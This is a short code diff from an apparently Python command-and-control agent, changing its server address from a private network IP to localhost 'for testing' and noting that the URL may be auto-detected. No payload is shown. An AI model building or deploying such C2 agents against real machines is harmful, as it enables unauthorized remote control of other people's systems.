@@ -16,7 +16,7 @@ import base64
 from io import BytesIO
 
 # Configuration - Server IP will be auto-detected or read from config
-SERVER_URL = "http://192.168.100.253:5000"  # Change to your C&C server IP
+SERVER_URL = "http://127.0.0.1:5000"  # Change to your C&C server IP (localhost for testing)
 AGENT_ID = None
 
 # Auto-detect server URL from environment or local config
